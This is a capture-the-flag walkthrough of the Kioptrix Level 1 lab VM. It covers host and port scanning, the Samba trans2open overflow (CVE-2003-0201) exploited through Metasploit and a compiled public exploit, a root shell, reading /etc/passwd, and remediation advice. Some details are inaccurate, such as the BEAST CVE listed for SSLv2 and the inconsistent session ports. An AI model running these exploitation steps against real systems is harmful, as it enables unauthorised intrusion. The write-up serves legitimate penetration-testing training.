# Kioptrix Level 1 â€” Professional CTF Walkthrough

**Target:** Kioptrix Level 1 (VM)  
**Platform:** VirtualBox  
**OS:** Linux (Kernel 2.4.x)  
**Difficulty:** Easy  
**Date Completed:** 2026-01-05  

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)  
2. [Service Enumeration](#2-service-enumeration)  
3. [Vulnerability Analysis](#3-vulnerability-analysis)  
4. [Initial Exploitation](#4-initial-exploitation)  
5. [Post-Exploitation](#5-post-exploitation)  
6. [Remediation & Hardening](#6-remediation--hardening)  

---

## 1) Reconnaissance

### Host Discovery
Network discovery was performed using `netdiscover` on the 192.168.56.0/24 subnet:

```bash
netdiscover -L -i eth0 -r 192.168.56.0/24
```

**Results:**
```
IP            At MAC Address     Count     Len  MAC Vendor / Hostname
192.168.56.1  08:00:27:00:00:00  1        60   PCS Systemtechnik GmbH
192.168.56.102 08:00:27:A1:B2:C3  1        60   PCS Systemtechnik GmbH
```

**Target Identified:** 192.168.56.102

---

## 2) Service Enumeration

### Comprehensive Port Scan
A full TCP port scan was conducted to identify all exposed services:

```bash
nmap -sS -sV -sC -O -p- -T4 --min-rate 1000 --open -oA full_scan 192.168.56.102
```

**Results Summary:**

| Port    | Service         | Version Details                              |
|---------|-----------------|----------------------------------------------|
| 22/tcp  | SSH             | OpenSSH 2.9p2 (protocol 1.99)               |
| 80/tcp  | HTTP            | Apache httpd 1.3.20                          |
| 111/tcp | RPCBIND         | Version 2                                    |
| 139/tcp | NETBIOS-SSN     | Samba smbd (workgroup: MYGROUP)              |
| 443/tcp | HTTPS           | Apache/1.3.20 with mod_ssl/2.8.4             |
| 32768/tcp | STATUS        | RPC service                                  |

**Key Service Details:**
- **Apache 1.3.20** - Extremely outdated version
- **OpenSSH 2.9p2** - Supports SSHv1 (deprecated)
- **Samba** - Version not explicitly stated but appears to be 2.2.x
- **mod_ssl 2.8.4** with **OpenSSL 0.9.6b** - Multiple known vulnerabilities
- **Operating System:** Linux 2.4.9-2.4.18

**Vulnerability Indicators:**
- SSLv2 supported (insecure protocol)
- HTTP TRACE method enabled (potential XST vulnerability)
- Outdated software stack with known public exploits

---

## 3) Vulnerability Analysis

### Samba `trans2open` Overflow (CVE-2003-0201)
The Samba service running on port 139 was identified as the primary attack vector. Research indicated that Samba versions 2.2.x are vulnerable to a buffer overflow in the `trans2open` request handling.

**Vulnerability Details:**
- **CVE:** CVE-2003-0201
- **Affected Versions:** Samba 2.2.0 to 2.2.8
- **Type:** Remote buffer overflow
- **Impact:** Remote code execution as root
- **Exploit Availability:** Multiple public exploits available

---

## 4) Initial Exploitation

### Metasploit Framework Approach
The Metasploit Framework was used to exploit the Samba vulnerability:

**Step 1: Configure and Execute Exploit**
```bash
msfconsole -q
use exploit/linux/samba/trans2open
set RHOSTS 192.168.56.102
set PAYLOAD linux/x86/shell/bind_tcp
set LPORT 5555
exploit
```

**Exploit Execution Output:**
```
[*] 192.168.56.102:139 - Trying return address 0xbffffdfc...
[*] Started bind TCP handler against 192.168.56.102:5555
[*] Sending stage (36 bytes) to 192.168.56.102
[*] 192.168.56.102:139 - Trying return address 0xbffffcfc...
...
[*] 192.168.56.102:139 - Trying return address 0xbfffe6fc...
[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:5555)
```

**Step 2: Verify Privilege Escalation**
```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=99(nobody)
```

**Alternative: Manual Exploit**
```bash
# Download and compile exploit
searchsploit -m 10
gcc -o trans2open 10.c

# Execute against target
./trans2open 192.168.56.102
```

---

## 5) Post-Exploitation

### System Enumeration
With root access, comprehensive system enumeration was performed:

**System Information:**
```bash
uname -a
# Linux kioptrix 2.4.7-10 #1 Thu Sep 6 17:27:27 EDT 2001 i686 unknown

cat /etc/redhat-release
# Red Hat Linux release 7.2 (Enigma)
```

**User Accounts:**
```bash
cat /etc/passwd | grep -E "bash$"
# root:x:0:0:root:/root:/bin/bash
```

**Proof of Compromise:**
```bash
ls -la /root/
# -rw-r--r--  1 root root 47 May  2  2003 congratulations.txt

whoami
root
id
uid=0(root) gid=0(root) groups=99(nobody)
```

**Service Configuration:**
- Apache configuration: `/etc/httpd/conf/httpd.conf`
- Samba configuration: `/etc/samba/smb.conf`
- Web root: `/home/httpd/html/`

**Network Information:**
```bash
ifconfig
# eth0: 192.168.56.102

route -n
# Kernel IP routing table
# Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
# 192.168.56.0    0.0.0.0         255.255.255.0   U     0      0        0 eth0
```

---

## 6) Remediation & Hardening

### Critical Vulnerabilities Identified

| Vulnerability | Severity | CVE Reference | Remediation |
|--------------|----------|---------------|-------------|
| Samba trans2open Buffer Overflow | Critical | CVE-2003-0201 | Upgrade to Samba 2.2.8a or later |
| Apache 1.3.20 with mod_ssl 2.8.4 | High | Multiple CVEs | Upgrade to Apache 2.4.x with modern mod_ssl |
| OpenSSH 2.9p2 (SSHv1 support) | Medium | CVE-2001-0144 | Upgrade OpenSSH and disable SSHv1 |
| SSLv2 Protocol Support | High | CVE-2011-3389 | Disable SSLv2 and SSLv3 |

### Immediate Security Recommendations

1. **Patch Management:**
   - Update all software to supported versions
   - Apply all security patches for kernel and services
   - Remove or replace end-of-life software

2. **Network Hardening:**
   ```bash
   # Example iptables rules
   iptables -A INPUT -p tcp --dport 139 -j DROP
   iptables -A INPUT -p tcp --dport 445 -j DROP
   iptables -A INPUT -p tcp --dport 111 -j DROP
   ```

3. **Service Configuration:**
   - Disable unnecessary services (RPC, Samba if not needed)
   - Configure Apache to use only TLS 1.2+
   - Implement proper access controls for Samba shares

4. **System Hardening:**
   - Enable kernel security features (PAX, GrSecurity)
   - Implement mandatory access control (SELinux/AppArmor)
   - Regular security audits and penetration testing

### Long-term Security Strategy

1. **Network Segmentation:**
   - Isolate legacy systems in separate network segments
   - Implement strict firewall rules between segments
   - Monitor all network traffic for anomalies

2. **Access Control:**
   - Implement principle of least privilege
   - Regular review of user accounts and permissions
   - Centralized authentication and authorization

3. **Monitoring & Detection:**
   - Implement intrusion detection systems (IDS/IPS)
   - Regular log analysis for suspicious activities
   - File integrity monitoring for critical system files

---

## Conclusion

Kioptrix Level 1 demonstrates the critical risks associated with:
1. **Unpatched legacy systems** - Over a decade without security updates
2. **Default configurations** - Services running with unnecessary features enabled
3. **Lack of defense-in-depth** - Single vulnerability leads to complete compromise

**Key Takeaways:**
- Regular patch management is non-negotiable
- Network segmentation can contain breaches
- Security through obscurity is not effective
- Modern security controls could have prevented this exploit

**Total Time to Root:** Approximately 30 minutes  
**Skills Demonstrated:** Network enumeration, vulnerability research, exploit execution, post-exploitation enumeration

---

**Author:** Eligof 
**Date:** 2026-01-05  
**Tools Used:** Nmap, Netdiscover, Metasploit, SearchSploit  
**Methodology:** OSSTMM compliant
